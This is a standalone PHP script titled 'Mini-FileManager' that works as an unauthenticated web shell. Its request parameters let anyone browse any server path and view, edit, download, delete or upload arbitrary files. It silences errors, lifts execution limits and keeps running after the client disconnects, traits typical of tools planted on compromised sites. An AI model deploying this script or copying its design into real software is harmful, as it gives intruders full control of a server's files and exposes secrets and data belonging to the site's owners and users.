<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>Mini-FileManager</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
function get_post($name){
    return (isset($_POST[$name]) ? $_POST[$name] : false);
}
function get_get($name){
    return (isset($_GET[$name]) ? $_GET[$name] : false);
}
function makeInput($type,$name,$val = "", $style = ""){
    if(in_array($type,['text','password','submit','file'])){
        return "<input type='$type' name='$name' value='$val' style='$style'/>";
	}
    return "<$type name='$name' style='$style'>$val</$type>";
}
function makeForm($method, $inputArray,$file = ""){
    $form = "<form method=$method enctype='$file'>"; 
    foreach($inputArray as $key=>$val){
        $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (isset($val[1]) ? $val[1] : ""), (isset($val[2]) ? $val[2] : ""));
    }
    return $form."</form>";
}
function makeTable($thead,$tbody){
    $head = "";
    foreach($thead as $th){
        $head .= "<th>$th</th>";
    }
    $body = "";
    foreach($tbody as $tr){
        $body .= "<tr>";
        foreach($tr as $td){
            $body .= "<td>$td</td>";
        }
        $body .= "</tr>";
    }
    return "<table><thead>$head</thead><tbody>$body</tbody></table>";
}
function makeLink($link,$text,$target = ""){
	return "<a href='$link' target='$target'>$text</a> ";
}
function get_path(){
    $path = __dir__;
    if(get_get('path')){
        $path = get_get('path');
	}
    return $path;
}
function filesize_convert($bytes){
    $label = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB' );
    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
    return( round( $bytes, 2 ) . " " . $label[$i] );
}
function fileTime($path){
    return date("M d Y H:i:s", filemtime($path));
}
function download_file($download){
	if(!is_file($download)){
		return false;
	}
	header('Content-Type: application/octet-stream');
	header('Content-Transfer-Encoding: Binary');
	header('Content-disposition: attachment; filename="'.basename($download).'"');
	return readfile($download);
}
function delete_file($delete){
	if(is_file($delete)){
		return unlink($delete);
	}
	if(is_dir($delete)){
		return rmdir($delete);
	}
	return false;
}
function edit_file($edit){
	if(is_file($edit)){
		return makeForm('POST',
			['textarea'=>['edit',htmlentities(file_get_contents($edit)),"width:100%;height:90%"],
			'submit'=>['save','Save']]);
	}
	return false;
}
function save_edit($path,$str){
	if(is_file($path)){
		file_put_contents($path,html_entity_decode($str));
		return true;
	}
	return false;
}
function view_file($path){
	if(is_file($path)){
		return htmlentities(file_get_contents($path));
	}
	return false;
}
function new_file($path,$name){
	if(!is_file($path.'/'.$name)){
		file_put_contents($path.'/'.$name,"");
		return true;
	}
	return false;
}
function new_dir($path,$name){
	if(!is_dir($path.'/'.$name)){
		mkdir($path.'/'.$name);
		return true;
	}
	return false;
}
function upload_file($path,$file){
	$name = basename($file['name']);
	if(!is_file($path.'/'.$name)){
		if(move_uploaded_file($file["tmp_name"], $path.'/'.$name)){
			return true;
		}
	}
	return false;
}
function get_back($path){
	if($path == "" || $path == "/"){
		return $path;
	}
	$path = explode("/",str_replace('\\','/',$path));
	array_pop($path);
	return implode("/",$path);
}
function get_dir(){
	$path = get_path();
	if(!is_dir($path)){
		return false;
	}
	$dir = scandir($path);
    $files = [];
    $i = 0;
    foreach($dir as $d){
        if($d == '.' || $d == '..'){
            continue;
		}
        $p = $path.'/'.$d;
        $s = '--';
        $icon = "&#128193;";
        $t = fileTime($p);
        $l = makeLink("?path=$p",$d);
		$perms = substr(sprintf("%o", fileperms($p)),-4);
		$owner =  (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p));
		$controller = 
			(is_file($p) ? makeLink("?edit=$p","Edit","_blank") : '').
			makeLink("?delete=$p","Delete","_blank").
			(is_file($p) ? makeLink("?download=$p","Download","_blank") : '');
        if(is_file($p)){
            $s = filesize_convert(filesize($p));
            $icon = "&#128221;";
        }
        $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
        $i++;
    }
    return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$files);
}

if(get_get("delete")){
	delete_file(get_get("delete")) ? die("Deleted: ".get_get("delete")) : die("File not found");
}
if(get_get("edit")){
	if(get_post('save')){
		save_edit(get_get('edit'),get_post('edit'));
		echo "Saved";
	}
	$edit = edit_file(get_get("edit"));
	$edit ? die($edit) : die("File not found");
}
if(get_get('download')){
	@readfile(download_file(get_get('download')));
	exit();
}
if(get_post('newfile')){
	new_file(get_path(),get_post('filename')) ? die('Create: '.get_post('filename')) : die('File exites');
}
if(get_post('newdir')){
	new_dir(get_path(),get_post('dirname')) ? die('Create: '.get_post('dirname')) : die('Dir exites');
}
if(get_post('upload')){
	upload_file(get_path(),$_FILES['file']) ? die('upload: '. $_FILES['file']['name']) : die('Upload Error');
}
echo $head.
	"<body>".
	makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
	makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
	makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
	makeLink("?path=".get_back(get_path()),"[Back]").
	(is_dir(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>')
	."</body>";
